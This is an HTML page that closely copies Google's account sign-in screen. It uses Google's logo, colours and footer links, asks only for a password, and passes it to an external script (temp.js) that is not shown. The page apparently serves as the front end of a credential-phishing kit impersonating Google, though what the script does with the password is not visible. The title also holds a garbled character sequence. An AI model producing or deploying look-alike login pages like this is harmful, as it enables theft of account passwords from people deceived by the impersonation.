<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Sign in â€“ Google Accounts</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet" />
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    body {
      font-family: 'Roboto', sans-serif;
      background-color: #f1f3f4;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .card {
      background-color: white;
      width: 450px;
      border-radius: 8px;
      padding: 40px;
      box-shadow: 0 1px 3px rgba(60,64,67,.3), 0 4px 8px rgba(60,64,67,.15);
      display: flex;
      flex-direction: column;
      justify-content: space-between;
    }
    .logo {
      width: 75px;
      margin-bottom: 20px;
    }
    h1 {
      font-size: 24px;
      font-weight: 400;
      margin-bottom: 8px;
    }
    .subtitle {
      font-size: 16px;
      color: #5f6368;
      margin-bottom: 30px;
    }
    input[type="password"] {
      width: 100%;
      padding: 14px;
      border: 1px solid #dadce0;
      border-radius: 4px;
      font-size: 16px;
      outline: none;
      transition: border 0.2s, box-shadow 0.2s;
    }
    input[type="password"]:focus {
      border-color: #1a73e8;
      box-shadow: 0 0 0 1px #1a73e8;
    }
    .link {
      color: #1a73e8;
      font-size: 14px;
      text-decoration: none;
      display: block;
      margin: 8px 0 24px;
      cursor: pointer;
    }
    .info {
      font-size: 13px;
      color: #5f6368;
      margin-bottom: 24px;
    }
    .info a {
      color: #1a73e8;
      text-decoration: none;
    }
    .actions {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-top: 16px;
    }
    .actions a {
      font-size: 14px;
      text-decoration: none;
      color: #1a73e8;
      cursor: pointer;
    }
    .actions button {
      background-color: #1a73e8;
      border: none;
      color: white;
      padding: 10px 24px;
      font-size: 14px;
      font-weight: 500;
      border-radius: 20px;
      cursor: pointer;
      transition: background-color 0.2s ease;
    }
    .actions button:hover {
      background-color: #1669c1;
    }
    .footer {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-top: 40px;
      font-size: 12px;
      color: #5f6368;
    }
    .footer a {
      color: #5f6368;
      text-decoration: none;
      margin-left: 12px;
      cursor: pointer;
    }
    .footer-left {
      flex: 1;
    }
    .footer-right {
      display: flex;
    }
    .message {
      margin-top: 16px;
      font-size: 14px;
      color: red;
      display: none;
    }
  </style>
</head>
<body>
  <div class="card">
    <div>
      <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png" class="logo" alt="Boogle Logo" />
      <h1>Sign in</h1>
      <div id="welcomeSubtitle" class="subtitle">Welcome</div>
      <input type="password" id="passwordInput" placeholder="Password" />
      <div class="actions">
        <a onclick="alert('Account creation not implemented.')"></a>
        <button onclick="handleNext()">Next</button>
      </div>
      <div class="message" id="messageBox"></div>
    </div>
    <div class="footer">
      <div class="footer-left">English (United States)</div>
      <div class="footer-right">
        <a href="https://support.google.com/accounts?hl=en&visit_id=638856154504280228-1720699841&rd=2&p=account_iph#topic=3382296" target="_blank">Help</a>
        <a href="https://policies.google.com/privacy?gl=IN&hl=en" target="_blank">Privacy</a>
        <a href="https://policies.google.com/terms?gl=IN&hl=en" target="_blank">Terms</a>
      </div>
    </div>
  </div>
<script src="temp.js"></script>
</body>
</html>
